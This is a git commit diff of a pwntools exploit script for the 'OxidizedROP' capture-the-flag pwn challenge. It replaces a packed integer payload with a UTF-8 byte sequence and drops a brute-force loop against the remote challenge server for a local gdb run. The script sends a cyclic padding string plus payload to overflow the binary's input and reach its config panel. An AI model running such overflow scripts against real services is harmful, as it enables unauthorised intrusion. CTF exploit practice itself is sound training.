fbe465a9bfb0e69def440ba604aaaafb6ccaa0f9
ShundaZhang <zhangshunda@gmail.com>
2023-04-08 19:23:30 +0800

    Found the utf-8 value of 123456.

--- ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
+++ ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
@@ -12,19 +12,23 @@ def enc(string): # Construct a UTF-8 string that has our input as char points
 
 ip, port = '134.122.104.91', 32475
 
-payload = p32(123456)
+payload = b'\xf0\x9e\x89\x80'
+#payload = b'@\xc3\xa2\x01'
 #print(payload)
 
-for i in range(1, 200-4+1, 1):
-	s = b'A'*i + payload
-	io = remote(ip, port)
-	#io = process('./oxidized-rop')
-	io.recvuntil(b'Selection:')
-	io.sendline(b'1')
-	io.recvuntil(b'Statement (max 200 characters):')
-	io.sendline(enc(s))
-	io.recvuntil(b'Selection:')
-	io.sendline(b'2')
-	io.interactive()
-	io.close()
+#for i in range(1, 200-4+1, 1):
+
+#s = b'A'*i + payload
+s = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaAB' + payload
+#io = remote(ip, port)
+#io = process('./oxidized-rop')
+io = gdb.debug('./oxidized-rop', 'break present_config_panel')
+io.recvuntil(b'Selection:')
+io.sendline(b'1')
+io.recvuntil(b'Statement (max 200 characters):')
+io.sendline(s)
+io.recvuntil(b'Selection:')
+io.sendline(b'2')
+io.interactive()
+io.close()
 
